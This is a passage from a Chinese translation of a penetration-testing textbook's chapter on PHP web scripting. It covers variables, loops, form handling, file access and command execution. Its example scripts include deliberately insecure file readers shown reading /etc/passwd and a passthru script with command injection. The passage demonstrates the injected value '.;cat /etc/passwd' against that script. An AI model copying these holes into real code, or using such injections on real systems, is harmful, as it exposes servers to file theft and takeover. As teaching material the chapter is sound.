  2. 更多关于 Mixins 的信息，请访问[www.ruby-doc.org/docs/ProgrammingRuby/html/tut_modules.html#S2](http://www.ruby-doc.org/docs/ProgrammingRuby/html/tut_modules.html#S2)。\n\
  \n# 第 5 章\n\n## PHP Web 脚本简介\n\n## 本章内容：\n\n- Web 脚本的用途\n- PHP 入门\n- 使用 PHP 处理表单\n\
  - 文件处理与命令执行\n- 综合应用\n\n许多渗透测试正在转向基于 Web 的评估，从而产生了两种不同类型的渗透测试：基于网络的渗透测试和基于 Web 的渗透测试。尽管\
  \ Python 和 Ruby 等语言在网络协议甚至二进制操作方面有大量应用，但本章将重点介绍渗透测试的 Web 应用方面。\n\nPHP 是许多 Web 程序员学习的第一门语言之一。在\
  \ Google 上搜索“PHP and MySQL”会得到超过 400 万条结果。虽然这些教程对新程序员来说非常棒，但对渗透测试人员也同样有用。学习 PHP\
  \ 的网站与保护 PHP 安全的网站之间的交集非常小，这导致许多新的 PHP 应用程序容易受到攻击。在本章中，我们将重点介绍渗透测试人员所需的 PHP 基础知识，然后探讨\
  \ PHP 的两种有用方式：远程文件包含和数据收集。\n\n## Web 脚本的用途\n\nWeb 脚本为我们提供了两个优势。一是能够操纵网页以实现我们的目标，另一个涉及数据收集。当我们完成漏洞评估并发现某个网页存在远程文件包含漏洞时，或者当我们能够链接漏洞利用使代码在远程服务器上运行时，我们就有能力通过\
  \ Web 服务器软件与操作系统进行交互。能够执行 shell 命令、操作文件系统、与数据库通信，以及在某些情况下通过套接字通信，在渗透测试中利用被攻破的 Web\
  \ 服务器非常有用。\n\n在执行测试时，我们可能还需要进行一定程度的凭证窃取或社会工程学攻击。在这种情况下，PHP 和 JavaScript 经常协同工作，我们将\
  \ JavaScript 代码注入网页，使网页收集信息并将其发送回我们的接收服务器。在这种情况下，我们的 PHP 将解析这些信息并记录下来以备将来使用。我们将在第\
  \ 9 章中看到这类示例。\n\n## PHP 入门\n\nPHP 代表 PHP：超文本处理器，是一种主要设计用于 Web 开发的开源脚本语言。PHP 页面通常是混合了\
  \ PHP 代码的 HTML 页面，以便将网站的功能与 HTML 代码合并。PHP 的常见用途包括数据库应用程序和处理表单的应用程序，因为 PHP 便于表单解析和数据处理，这些是表单应用程序的一部分。PHP\
  \ 还被用作许多 Web 2.0 应用程序的框架，因为它能够轻松处理数据库，并通过常见的 Web 2.0 协议（如可扩展标记语言（XML）和 JavaScript\
  \ 对象表示法（JSON））进行响应。\n\n### 范围\n\nPHP 功能丰富且全面，具备从数据库、套接字到文件系统操作的能力。PHP 可用于替代 bash\
  \ 或其他基于主机的脚本语言来执行脚本任务。在渗透测试中，我们很少这样使用 PHP，因为还有其他语言更适合基于主机的脚本，而 PHP 的强项在于基于 Web 的脚本，因此本章将重点介绍\
  \ PHP 中基于 Web 的方面。这并不是说我们不会涉及文件系统操作或其他可能对命令行脚本有帮助的领域，但不会深入探讨，并且讨论的上下文将是基于 Web 的场景。\n\
  \n### PHP 基础\n\n为了运行我们的 PHP 脚本，我们必须确保 Web 服务器正在运行。为此，我们在 BackTrack 5 上通过执行命令`/etc/init.d/apache\
  \ start`来启动 Apache。接下来，我们将切换到 Web 目录[`/var/lib/www`](http://var/lib/www)。该目录是 Apache\
  \ 服务器的根网站目录，我们创建的文件将通过我们的网站[`localhost`](http://localhost)访问。\n\n现在我们的站点已配置好，让我们构建一个简单的\
  \ PHP 页面。Base64 是一种在互联网上常用于编码传输数据的编码方法。当我们遇到 Base64 编码的数据时，其标志是一串以等号结尾的文本。遇到这类数据时，最简单的解码方法是使用脚本。对于我们的第一个\
  \ PHP 页面，让我们构建一个。\n\n对于我们的第一个网页，我们希望能够通过 URL 或表单接受输入。当我们提交数据时，有三种方式可以访问这些数据。第一种是通过`$_GET`或`$_POST`数组。正如我们可能猜到的，这些数组包含通过\
  \ GET 和 POST 请求提交的数据。第二种是通过`$_REQUEST`数组，它包含`$_GET`数组、`$_POST`数组和`$_COOKIE`数组的值。第三种方式需要\
  \ PHP 配置文件中的`register_globals`设置启用。在 PHP 5 版本中，默认禁用此设置，因为它被认为不太安全，这也是这里提及的原因。`register_globals`会强制将通过\
  \ GET 或 POST 请求提交的任何数据分配一个变量。如果我们提交一个字符串`a=b`，那么`$a`变量将自动设置为 b。在构建我们自己的脚本时，我们希望避免这种行为，因为我们希望脚本无论配置如何都能在\
  \ Web 服务器上工作，所以我们为了兼容性而编码，而不是为了易用性。\n\n```php\n<?php\n```\n\n\n\n```\nif($_REQUEST['b64'])\n\
  {\n  print \"Base64 value for \" . htmlspecialchars($_REQUEST['b64']) . \" is <BR>\\\
  n<PRE>\";\n  print htmlspecialchars(base64_decode($_REQUEST['b64']));\n  print \"\
  \\n</PRE>\\n<BR>\";\n}\n?>\n```\n\n</BR>\n\n<FORM METHOD=POST>\n   <TEXTAREA NAME='b64'\
  \ COLS=80 ROWS=5>\n   </TEXTAREA>\n   <BR>\n   <INPUT TYPE=SUBMIT VALUE=\"Submit!\"\
  >\n</FORM>\n\n我们首先打开 PHP 代码块。在网页中有两种方式打开 PHP 代码块：使用 `<?php` 头部或使用 `<?` 标签。`<?` 标签被称为短开标签。它是早期\
  \ PHP 版本中常用的一种简写标签，因为它提供了一些快捷方式并缩短了代码。问题在于，如果短标签未启用，Web 服务器会将所有 PHP 代码输出到网页中。显然，这不是我们想要的，而且启用短标签可能会导致\
  \ XML 渲染问题，因此其默认状态现在是关闭的。因此，在我们的所有代码示例中，我们将使用 `<?php` 开标签。\n\n一旦代码块打开，我们检查 `$_REQUEST`\
  \ 数组中是否有任何输入。我们专门查找要解码的 `b64` 变量。如果存在，我们首先使用 `print` 语句将其打印回屏幕，同时将数据包裹在 `htmlspecialchars`\
  \ 函数中。该函数转义 HTML 字符，以确保我们不会渲染任何不应渲染的 HTML 标签。如果不使用此函数，有人可能会发送包含 HTML 代码的请求，我们的页面会尝试渲染它。\n\
  \n接下来，我们打印 `base64_decode` 函数的输出。该函数解码 Base64 编码的数据并将其作为字符串返回。我们打印该字符串，然后关闭用于确保格式保持的\
  \ `PRE` 标签。\n\n输入显示后，我们想创建一个简单的表单来提交数据。我们通过创建一个 HTML 表单块并指示它应通过 `POST` 方法提交来实现。接着，我们创建一个\
  \ `textarea` 块，并赋予足够的列数和行数，以便在粘贴编码数据时能够查看。最后，我们创建一个提交按钮，表单就完成了。图 5.1 显示了脚本（我们将命名为\
  \ `b64.php`）的示例输出。\n\n![image](img/F000059f05-01-9781597497299.jpg)\n\n图 5.1 b64.php\
  \ 的输出\n\n#### 变量\n\n与我们之前看过的其他语言类似，PHP 中的变量是弱类型的。我们通常不需要在创建变量时定义其类型。我们将遇到的主要类型有字符串、整数、浮点数、数组、布尔值和对象。PHP\
  \ 中的对象是 PHP 类的实例化。\n\nPHP 变量以美元符号（`$`）为前缀，表示它们应被解释为变量。这些变量可以直接包含在字符串中打印而无需转换，但数组除外，它们需要被花括号（`{}`）包裹才能正确解释。布尔值在打印时也有一些特殊考虑，因为它们不会打印\
  \ `true` 或 `false`，而是分别打印 `1` 或空字符串。\n\n```\n<?php\n$i = 5;\n$f = 5.5;\n$b = true;\n\
  $a = array(1,2,3,4,5);\n$h = array('a' => 'b','c' => 'd');\nprint \"My values are:\
  \ $i, $f, $b, {$a[0]}, {$h['a']}\\n\";\nprint_r($a);\nprint_r($h);\n?>\n```\n\n\
  当我们运行变量测试代码时，可以看到整数 `5` 和浮点数 `5.5` 都按预期打印。布尔值 `true` 被转换为 `1`。我们创建了两个数组。第一个是基本数组，值从\
  \ `1` 到 `5`。第二个数组使用了命名值。这类似于哈希，因此我们将键 `a` 和 `c` 分别赋值为 `b` 和 `d`。在基本打印行中打印这些值时，我们想要基本数组的第一个元素和哈希的\
  \ `a` 值。我们将这些值包裹在花括号中，以便 `print` 语句知道将整个内容视为变量。`print_r` 函数主要用于调试。它接受一个结构（如我们的数组）并递归地打印出来。这使我们能够以友好的方式查看数据结构，而无需编写特殊代码来枚举它。\n\
  \n当我们运行脚本时，如图 5.2 所示，我们将看到打印行按预期输出值。`print_r` 输出的格式略有不同，旨在易于阅读。请注意，在网页中使用此输出时，如果输出旨在以可读形式显示在页面源之外的任何位置，我们需要将输出包裹在\
  \ `PRE` 标签中，以便正确格式化显示。\n\n![image](img/F000059f05-02-9781597497299.jpg)\n\n图 5.2\
  \ variables.php 脚本的输出\n\n#### 输出\n\n在 PHP 中有三种基本方式打印输出。我们在前两节中已经看到了 `print` 的使用。另外两种方式是通过\
  \ `echo` 命令和 `printf` 命令。`echo` 命令与 `print` 命令非常相似，但有一个区别：`echo` 命令可以接受字符串以外的参数。使用\
  \ `print` 语句时，我们必须使用连接运算符来构建一个将被打印的单一字符串。连接运算符是一个点（`.`），用于将多个字符串或变量连接成一个字符串。使用 `echo`，我们可以将任何变量添加到以逗号分隔的列表中，并将字符串和变量作为参数组合，输出结果相同。\n\
  \n第三种输出方法 `printf` 提供了我们在其他语言中见过的格式化功能。这对于文件输出值得一提，但在输出到网页时很少使用 `printf`。`printf`\
  \ 接受多个参数，其中第一个参数是格式字符串，后续每个参数是要在格式字符串中打印的值。通过一个示例可以最好地说明这一点。\n\n```\n<?php\n$i =\
  \ 5;\n$f = 5.5;\n$b = true;\n$a = array(1,2,3,4,5);\n$h = array('a' => 'b','c' =>\
  \ 'd');\nprintf(\"My values are: %d, %2.2f, %d, %d, %s\\n\",\n   $i, $f, $b, $a[0],\
  \ $h['a']);\n?>\n```\n\n我们再次使用熟悉的变量测试代码，并将输出替换为 `printf` 语句。我们看到，对于十进制整数使用 `%d`，对于浮点数使用\
  \ `%f`（此处格式化为小数点前两位和小数点后两位），对于字符串值使用 `%s`（此处是哈希中 `b` 的输出）。我们可以使用 `printf` 创建非常复杂的格式字符串，包括在需要时输出二进制。\n\
  \n注意\n\n格式字符串语法可能相当复杂，并且有比我们介绍的更多的选项。要查看字符串格式运算符的完整列表以及允许使用格式字符串创建字符串的 `sprintf`\
  \ 函数，请访问 `sprintf` 帮助页面 [www.php.net/manual/en/function.sprintf.php](http://www.php.net/manual/en/function.sprintf.php)。\n\
  \n#### 控制语句\n\n我们现在已经掌握了一些处理 PHP 页面的基础知识。那么，让我们学习一些条件语句和循环，以便创建更有趣的代码。我们将介绍三种不同类型的循环：`for`\
  \ 循环、`foreach` 循环和 `while` 循环。这三种循环结构应该提供足够的功能来处理几乎任何代码块。我们还需要了解条件语句，以理解如何根据条件控制代码块的执行。为此，我们将构建一些代码，枚举\
  \ PHP 中一些提供服务器变量和环境变量访问的内置数组。\n\n```\n<PRE>\n<?php\nif(function_exists('php_uname'))\n\
  {\n   print \"Server Uname is: \";\n   print php_uname() ;\n   print \"\\n\";\n\
  }\nforeach (array_keys($_ENV) as $i){\n   print \"\\$_ENV[$i] = {$_ENV[$i]}\\n\"\
  ;\n}\n$keys = array_keys($_SERVER);\nfor($i = 0; $i < count($keys); $i++)\n{\n \
  \  if ($keys[$i] == '_' || $keys[$i] == 'ORACLE_HOME')\n   {\n     continue;\n```\n\
  \n\n\n\n   }\n\n   print `\"\\$_SERVER[{$keys[$i]}] = {$_SERVER[$keys[$i]]}\\n\"\
  `;\n\n}\n\n`$i = 0`;\n\n`$keys = array_keys($_GET)`;\n\n`while($i < count($keys))`\n\
  \n{\n\n   print `\"\\$_GET[{$keys[$i]}] = {$_GET[$keys[$i]]}\\n\"`;\n\n   `$i++`;\n\
  \n}\n\n`?>`\n\n```php\n</PRE>\n```\n\n要开始这个脚本，我们首先检查 `php_uname` 函数是否存在。如果存在，该语句将返回\
  \ true，我们的代码块就会执行。如果我们在 Linux 系统上，这个条件应该返回 true，但在 Windows 上可能不会。如果条件为 true，它会以可读的格式打印输出。我们在脚本开头使用了\
  \ `<PRE>` 标签，以确保输出到浏览器的内容与打印到屏幕时的格式一致。这意味着我们无需担心 HTML 格式，只需构建标准字符串，Web 浏览器就会按原样呈现它们。\n\
  \n在下一个代码块中，我们希望遍历 `$_ENV` 数组的每个元素，这个数组将操作系统环境变量暴露给 PHP。为此，我们使用 `foreach` 循环，指定从\
  \ `keys` 函数返回的每个元素都应赋值给一个变量。循环会针对 `$_ENV` 数组中的每个键迭代一次，我们可以通过 `$i` 变量访问当前键。打印输出时，我们希望看到带有美元符号的变量名，以向查看者表明这是一个变量。为了让美元符号被打印出来，而不是被当作变量解析，我们在美元符号前加上转义字符\
  \ `\\`，表示它不应被解析。我们使用花括号来表示整个表达式 `$_ENV[$i]` 应被解析，这样 `_ENV` 数组中当前键对应的值就会被插入到字符串中并打印。\n\
  \n我们希望对 `_SERVER` 数组执行相同的操作，该数组包含服务器特定的变量。这些信息允许我们访问 Web 服务器的相关信息，如用户和路径信息。我们将以稍微不同的方式处理第二个循环，即\
  \ `for` 循环。`for` 循环允许我们从起始条件开始迭代，直到满足某个条件，每次迭代都会执行一些额外的代码来帮助我们达成目标。在 `for` 循环语法中，每个部分由分号分隔。在我们的具体示例中，我们通过创建\
  \ `_SERVER` 数组键的新数组来设置 `keys` 变量。我们希望从数组的开头开始循环，遍历每个元素，直到到达末尾。对于我们的 `for` 循环，起始状态是将\
  \ `$i` 设置为零。这样我们就能在第一次迭代中访问数组的第一个元素。我们希望继续遍历数组，直到到达最后一个元素。为此，我们在每次迭代中将 `$i` 与数组的长度进行比较。如果相等，说明已到达数组末尾，我们希望停止迭代。最后要做的是确保每次循环时迭代器\
  \ `$i` 递增。为此，我们使用 `for` 循环的最后一部分，通过命令 `$i++` 来递增 `$i`。这是 PHP 中 `$i = $i + 1` 的简写形式，是一种快速将\
  \ `$i` 加一的方法，但如果需要将 `$i` 增加超过一，我们就得采用常规方式。\n\n接下来，我们有一个条件语句，用于检查当前键是否为两个特定值之一：`_`\
  \ 键或 `ORACLE_HOME` 键。这些值在这个脚本中是随意选择的，但这个示例旨在展示如何轻松过滤掉这些值。我们使用了与其他语言相同的布尔逻辑。`||`\
  \ 运算符表示布尔 OR，`&&` 运算符表示布尔 AND。因此，我们的代码检查这两个条件中是否有任何一个为 true，如果任一语句返回 true，则执行代码块。如果键是这两个值之一，我们通过\
  \ `continue` 关键字跳转到循环的下一次迭代。`continue` 告诉脚本停止当前操作，并继续执行循环的下一次迭代。\n\n如果条件语句不满足，我们的代码将被打印。请注意，我们使用了与上次相同的打印格式，但有一个例外：我们需要通过\
  \ `$i` 迭代器来引用 `$keys` 数组中的每个元素，而不是将 `$i` 本身作为键。这使得打印值稍微复杂一些，因为我们需要分两步引用值。第一步是获取键值。为此，我们使用\
  \ `$keys` 数组并访问 `$i` 元素。然后将该值作为我们在 `_SERVER` 数组中搜索的值。这在语法上稍微复杂一些，但在某些情况下，使用这类结构是必要的。\n\
  \n我们的最后一种循环类型是 `while` 循环。`while` 循环在条件为 true 时持续迭代。在我们的例子中，当 `$i` 变量小于数组长度时进行迭代。我们完成的基本任务与\
  \ `for` 循环相同，只是代码的排列方式略有不同。我们必须在循环之前将 `$i` 初始化为 0，并且必须在循环中自行递增 `$i`。否则，使用 `_GET`\
  \ 数组打印的值将与使用 `_SERVER` 数组打印的值相同。执行脚本时，我们需要在 URL 行中将 `_GET` 选项传递给脚本。这也让我们有机会尝试操作\
  \ GET 请求。\n\n现在我们已经有了代码，将其保存为 `/var/www` 目录下的 `get.php`，然后在 Web 浏览器中访问 [`127.0.0.1/get.php?var1=phprulez`](http://127.0.0.1/get.php%3Fvar1%3Dphprulez)。我们应该能看到所有输入被打印到屏幕上，包括\
  \ `_GET` 数组中一个值为 `phprulez` 的 `var1` 条目。图 5.3 显示了预期输出的最后一部分。屏幕上输出的内容远不止这些，请仔细查看这些输出，熟悉可以从运行在\
  \ Web 服务器上的 PHP 页面中获取的不同信息。\n\n![image](img/F000059f05-03-9781597497299.jpg)\n\n\
  图 5.3 `get.php` 输出的结尾\n\n### 函数\n\n在 PHP 中，与 Python、Perl、Ruby 以及我们介绍过的其他语言类似，函数通过减少代码重复来帮助我们。PHP\
  \ 函数的语法与我们使用过的其他语言非常相似。要创建一个函数，我们使用 `function` 关键字，后跟要创建的函数名。让我们看一个示例。\n\n```php\n\
  <?php\n\nfunction printPre($data, $label = \"\")\n{\n   if($label != \"\")\n   {\n\
  \     print \"<div align=center>$label</div><BR>\\n\";\n   }\n   print \"<PRE>\\\
  n\";\n   print_r($data);\n   print \"</PRE>\\n\";\n}\n\nprintPre($_SERVER);\nprintPre($_ENV,\"\
  Environment Variables\");\n?>\n```\n\n在调试代码时，能够轻松打印调试输出是很有用的。在之前的示例中，我们使用 `PRE`\
  \ 标签来打印数组。现在让我们将其转换为一个函数。我们希望函数接受一个参数，即要打印的内容。此外，我们可能希望轻松地添加一个标题。对于我们的函数，让它要求一个必需参数（要打印的数据），并接受一个可选参数（希望与数据一起打印的标题）。为了表示第二个参数是可选的，我们为其设置一个默认值，以便在未使用时生效。在函数中，我们检查第二个参数是否不为空；如果不为空，则将其居中打印为标题。\n\
  \n函数的第一个参数是要打印的数据。我们首先打印 `PRE` 标签，然后对数据执行 `print_r`，以确保如果数据是数据结构，它能被正确打印。接着打印结束的\
  \ `PRE` 标签，函数就完成了。在代码中，我们以两种方式调用函数：第一次不带标题，第二次带标题。图 5.4 显示了带有标题的部分输出。\n\n![image](img/F000059f05-04-9781597497299.jpg)\n\
  \n图 5.4 `printpre.php` 的输出\n\n## 使用 PHP 处理表单\n\n\n\n\n我们在 PHP 简介中简要介绍了表单处理。现在让我们更深入地探讨处理表单数据的不同方式。回顾一下，当表单提交到\
  \ PHP 脚本时，会创建三个数组。第一个数组是`$_GET`数组，包含通过 URL 传递的选项。`$_POST`数组包含通过 POST 请求提交的值，而`$_REQUEST`数组则包含两者的组合。PHP\
  \ 会自动处理这些，因此我们无需做任何特殊操作即可获得这些值。唯一的例外是上传文件时。当我们上传文件时，信息会被添加到`$_FILE`数组中，并且数据看起来会有所不同。让我们构建一个带有测试表单的测试脚本来评估这一点。\n\
  \n```\n<?php\n\nif($_REQUEST[’submit’])\n\n{\n\n   print \"<PRE>\\nGET:\\n\";\n\n\
     print_r($_GET);\n\n   print \"\\n\\nPOST:\\n\";\n\n   print_r($_POST);\n\n   print\
  \ \"\\n\\nFILES:\\n\";\n\n   print_r($_FILES);\n\n   print \"\\n\\n</PRE\\n\";\n\
  \n}\n\n?>\n\n<DIV ALIGN=CENTER>\n\n<FORM METHOD=POST ACTION=\"formtest.php?get1=test&get2=alsotest\"\
  \n\n   ENCTYPE=\"multipart/form-data\">\n\n<TABLE BORDER=1>\n\n<TR><TH COLSPAN=2>\
  \ Test Form </TH></TR>\n\n<TR><TD>Text</TD><TD><INPUT NAME=\"text\" TYPE=TEXT></TD></TR>\n\
  \n<TR><TD>Checkbox</TD><TD><INPUT NAME=\"check\" TYPE=CHECKBOX CHECKED></TD></TR>\n\
  \n<TR><TD>Radio Yes</TD><TD><INPUT NAME=\"radio\" TYPE=RADIO VALUE=\"yes\"></TD></TR>\n\
  \n<TR><TD>Radio No</TD><TD><INPUT NAME=\"radio\" TYPE=RADIO VALUE=\"no\"></TD></TR>\n\
  \n<TR><TD>File</TD><TD><INPUT NAME=\"file\" TYPE=FILE></TD></TR>\n\n<TR><TH COLSPAN=2><INPUT\
  \ TYPE=SUBMIT NAME=\"submit\" VALUE=\"SUBMIT!\"></TH></TR>\n\n</TABLE>\n\n</FORM>\n\
  \n</DIV>\n```\n\n我们首先检查代码是否已提交。如果在`_REQUEST`数组中设置了`submit`，我们就知道表单应该有数据。为了将这些数据打印到屏幕上，我们首先打印一个\
  \ PRE 标签，然后打印单词 GET，以便我们知道正在查看哪个数组。我们将每个数组打印到屏幕上——`_GET`、`_POST`和`_FILES`。这些应该包含提交到脚本的任何信息。我们关闭\
  \ PRE 标签，关闭条件语句，然后开始构建表单。\n\n为了使表单居中，我们使用一个 div 标签并将对齐方式设置为居中。我们创建一个表单，并将其提交方式设置为\
  \ POST。为了同时支持 GET 和 POST 方法，我们需要让表单提交到一个已经设置了某些 GET 选项的 URL。我们将 ACTION 设置为脚本本身，并设置了两个\
  \ GET 选项：`get1`和`get2`。问号表示我们已经开始设置选项，每个键值对使用键=值语法设置。每组键值对之间用&符号分隔。因此，当我们提交后查看`_GET`数组时，即使我们没有将值作为表单变量输入，也应该看到它们出现在数组中。\n\
  \n接下来，我们设置一个表格，使表单更易读。我们设置一个标题为“Test Form”，然后开始创建表单条目。我们设置一个名为 Text 的文本框，一个已选中且名为\
  \ Checkbox 的复选框，然后是两个同名的单选按钮，但值不同，以便用户可以在它们之间切换。最后一个输入是文件，这将允许我们使用`_FILE`数组。我们必须在表单中添加一个编码类型，以便提交文件本身而不是实际名称。`multipart/form-data`将对文件和其他表单变量进行编码，格式允许服务器为我们处理文件。让我们测试一下。\n\
  \n注意，从图 5.5 的输入中，我们在图 5.6 中看到显示了三个数组：`_GET`数组、`_POST`数组和`_FILE`数组。`_GET`数组显示了我们放入表单\
  \ ACTION 变量中的两个值。有一个`get1`和一个`get2`变量，并设置了相应的值。在`_POST`数组中，我们看到提交的表单值，但不包括文件信息。`_FILE`数组包含我们提交的文件信息，但由于提交的文件包含扩展信息，因此该数组的信息比其他数组多得多。`_FILE`数组包含一个键，即表单中的文件输入，其值是另一个数组。该数组包含文件名、文件包含的信息类型、大小以及脚本运行时文件所在的位置。PHP\
  \ 在脚本执行期间将文件保存在`/tmp`中。这允许我们操作文件，而无需将其永久保存在磁盘上，并确保脚本完成后可以轻松清理文件。\n\n警告\n\n任何时候我们从表单接受数据并存储它，都需要意识到存储该数据的后果。如果此脚本是公开可访问的，并且有人一次提交了许多大文件，我们可能会填满系统磁盘并导致系统不稳定。本章中的许多示例都是如此，但在接受文件时尤其要注意潜在后果，并确保有足够的磁盘空间来容纳文件上传。\n\
  \n![image](img/F000059f05-05-9781597497299.jpg)\n\n图 5.5 对`formtest.php`脚本的示例输入\n\
  \n![image](img/F000059f05-06-9781597497299.jpg)\n\n图 5.6 `formtest.php`脚本的输出\n\n\
  ## 文件处理与命令执行\n\n现在我们已经了解了操作 PHP 代码的一些基础知识，接下来进入我们作为渗透测试人员最常使用的领域。能够通过 PHP 脚本保存收集的数据、从其他来源拉取数据，以及利用运行\
  \ PHP 的服务器进一步访问网络，这些都是成功测试的关键概念。在处理 PHP 时，我们不会创建或解析复杂的文件。在大多数情况下，我们需要保存一些基本数据，或者将文件中的数据包含到脚本输出中。因此，我们不会过多涉及二进制文件操作，而是专注于我们在实际工作中将使用的主要方面：保存数据和检索数据。我们将把这些概念应用于文件、套接字和命令\
  \ shell。\n\n### 文件处理\n\n掌握 PHP 中的文件处理使我们能够通过网页与文件系统交互，从而利用 Web 漏洞获得更高级别的服务器访问权限。访问文件有三种基本方式。一种是包含另一个\
  \ PHP 文件以执行其他命令。另外两种涉及从文件系统中获取数据或将数据放入文件。让我们先研究如何加载其他 PHP 文件。\n\n首先，让我们创建两个文件。在第一个文件中，我们将其命名为`test.inc`，包含代码`<?php\
  \ echo \"hello world\" ?>`。在第二个文件中，我们将包含该文件以使其执行 PHP 代码。在第二个文件（名为`test.php`）中，我们插入代码`<?php\
  \ include('test.inc') ?>`。现在执行我们的`test.php`代码。运行`test.php`时，我们应该看到“hello world”语句。我们刚刚从另一个文件中执行了代码。有四种不同的方式可以包含这样的文件。它们是`include`、`require`、`include_once`和`require_once`。`include`函数会尝试包含其他文件，但如果失败，会返回一个警告。`require`语句在无法包含文件时会停止执行。两个`once`变体设计为：如果我们尝试包含一个已经包含过的文件，该文件不会被再次包含，但函数仍会成功返回。\n\
  \n\n\n现在我们已经知道如何包含其他 PHP 文件，接下来看看如何在 PHP 中创建一个简单的文件下载器。有时我们需要生成一些代码，以便从远程服务器拉取数据。PHP\
  \ 可以通过向浏览器发送头部信息来帮助我们，让浏览器知道即将接收一个文件，并提示我们保存该文件。让我们看看实现这一功能所需的代码。\n\n```\n<?php\n\
  \n   if($_GET[’file’])\n\n   {\n\n     $file = $_GET[’file’];\n\n     if(file_exists($file)\
  \ && is_file($file))\n\n     {\n\n       $basename = basename($file);\n\n      \
  \ header(\"Content-disposition: attachment; filename=$basename\");\n\n       readfile($file);\n\
  \n     }\n\n   }\n\n?>\n```\n\n我们首先在 `$_GET` 数组中查找 `file` 键的值。如果正确传递给脚本，该值应包含一个文件名。如果值存在，我们将\
  \ `$file` 变量设置为传入的文件路径。然后进行另一个条件判断，确认文件存在且是一个文件；否则脚本将失败。如果检查通过，我们开始确定文件名的最后一部分。`basename`\
  \ 函数通过剥离传入字符串中所有与路径相关的内容来实现这一点，从而只得到文件名本身。我们在头部中使用这个文件名，告诉 PHP 向浏览器返回一个 `Content-disposition`\
  \ 头部，表明我们将发送一个文件附件，并且文件名应为文件名本身，不包含路径信息。设置完成后，浏览器会将后续所有内容解释为文件内容。我们使用 `readfile`\
  \ 函数获取文件的全部内容并输出。让我们用 URL [`localhost/download.php?file=/etc/passwd`](http://localhost/download.php%3Ffile%3D/etc/passwd)\
  \ 测试一下，并在图 5.7 中查看输出。\n\n![image](img/F000059f05-07-9781597497299.jpg)\n\n图 5.7\
  \ download.php 的输出\n\n到目前为止，我们已经以两种不同的方式处理了文件，现在来看看第三种方式。PHP 还可以以更传统的方式读写文件。我们在其他语言（如\
  \ Ruby 和 Python）中使用过文件打开命令，而 PHP 有一个与我们之前见过的命令非常相似的命令。`fopen` 函数允许我们以读取、写入或追加模式打开文件，就像其他语言一样。为了探索这一点，让我们看一个脚本，它可以根据\
  \ GET 参数读取或写入数据。\n\n提示\n\nPHP 还有其他用于操作文件和文件系统的函数。要了解更多关于这些函数以及如何使用它们构建更复杂的文件操作和查询工具的信息，请访问\
  \ PHP 文件系统命令的函数参考页面：[www.php.net/manual/en/ref.filesystem.php](http://www.php.net/manual/en/ref.filesystem.php)。\n\
  \n```\n<?php\n\nif($_GET[’read’])\n\n{\n\n   $file = $_GET[’read’];\n\n   if(file_exists($file)\
  \ and is_file($file))\n\n   {\n\n     $f = fopen($file,\"r\");\n\n     print \"\
  <PRE>File contents are:\\n\";\n\n     $out = \"\";\n\n     while($data = fread($f,1024))\n\
  \n     {\n\n       $out .= $data;\n\n     }\n\n     fclose($f);\n\n     print $out;\n\
  \n   }\n\n}\n```\n\n我们将代码分为两部分。如果设置了 `read` GET 变量，我们将 `$file` 变量设置为 `$_GET` 数组中\
  \ `read` 键的值。如果文件存在，我们使用 `fopen` 函数以读取模式打开文件。我们通过将模式设置为 `r` 来指定读取文件，就像在 Perl 和 Python\
  \ 中一样。`fopen` 函数返回一个文件句柄，我们将其赋值给 `$f`。从现在起，我们将使用这个文件句柄来引用该文件。我们初始化一个 `$out` 变量，用于存储输出。为了读取整个文件，我们创建一个\
  \ `while` 循环，每次从文件中读取最多 1024 个字符的数据。每次迭代后，我们使用连接运算符 `.=` 将读取的数据追加到 `$out` 变量中，该运算符将\
  \ `$out` 设置为 `$out` 加上 `$data` 的值。当数据读取完毕时，循环停止。我们关闭文件并将输出打印到屏幕。\n\n```\nif($_GET[’write’]\
  \ && $_GET[’data’])\n\n{\n\n  $file = $_GET[’write’];\n\n  $data = $_GET[’data’];\n\
  \n  $f = fopen($file,\"a+\");\n\n  fwrite($f,$data . \"\\n\");\n\n  fclose($f);\n\
  \n  print \"Write to $file: <BR><PRE>$data</PRE>\";\n\n}\n\n?>\n```\n\n对于写入数据，我们需要同时检查文件名和要写入的数据。我们构建一个条件，检查\
  \ `$_GET` 数组中是否设置了 `write` 键和 `data` 键。如果两个键都设置了，我们将 `$file` 设置为文件名，`$data` 设置为要写入文件的数据。接下来，我们通过指定\
  \ `a+` 模式以追加模式打开文件。`fopen` 函数返回一个文件句柄，我们使用该句柄调用 `fwrite` 函数。`fwrite` 接受两个参数：文件句柄和要写入的数据。写入数据后，我们关闭文件句柄并在屏幕上打印一条成功消息。为了测试这个脚本，我们将其命名为\
  \ `readwrite.php`，并使用 URL [`localhost/readwrite.php?read=/etc/passwd&write=/tmp/test&data=This`](http://localhost/readwrite.php%3Fread%3D/etc/passwd%26write%3D/tmp/test%26data%3DThis)\
  \ is a test 进行测试，应该会看到类似于图 5.8 的输出。\n\n![image](img/F000059f05-08-9781597497299.jpg)\n\
  \n图 5.8 readwrite.php 的输出\n\n### 命令执行\n\n命令执行是 PHP 中的一个重要概念，因为当我们在 PHP 应用程序中发现漏洞时，能够在服务器上执行任意代码将有助于我们进一步获取对机器的访问权限。在\
  \ PHP 中，有三种基本方法可以在操作系统上执行命令：`passthru`、`exec` 和 `system` 函数。`passthru` 允许我们将执行代码的输出打印到屏幕，而另外两个函数则以不同的方式返回数据。我们先来看\
  \ `passthru`，在一个现实世界中可能遇到的例子中：一些脚本执行代码以协助系统管理员任务。让我们看一个脚本，它会列出传入文件的扩展属性。\n\n```\n\
  <?php\n\nprint \"<PRE>\";\n\n$file = $_GET[’file’];\n\npassthru(\"ls −l $file\"\
  );\n\nprint \"</PRE>\";\n\n?>\n```\n\n我们的代码从 GET 参数中获取 `file` 变量，然后对其执行 `ls -l`\
  \ 命令。`passthru` 命令的输出直接打印到屏幕。我们将输出包裹在 `PRE` 标签中，使其显示正常。首先，我们按预期使用脚本：将脚本保存为 `systest.php`，然后访问\
  \ [`localhost/systest.php?file=beef`](http://localhost/systest.php%3Ffile%3Dbeef)。我们可以看到输出是\
  \ `beef` 子目录的目录列表。现在，让我们看看如何滥用这样的脚本。还记得我们在第 1 章中介绍的所有 shell 命令吗？让我们把它们用起来。访问 [`localhost/systest.php?file=.;cat`](http://localhost/systest.php%3Ffile%3D.%3Bcat)\
  \ /etc/passwd。在图 5.9 中，我们可以看到我们包含了 `.` 目录的列表，但通过使用分号，我们链式添加了另一个命令，并且还可以看到 `/etc/passwd`\
  \ 的内容。\n\n![image](img/F000059f05-09-9781597497299.jpg)\n\n图 5.9 利用 systest.php\n\
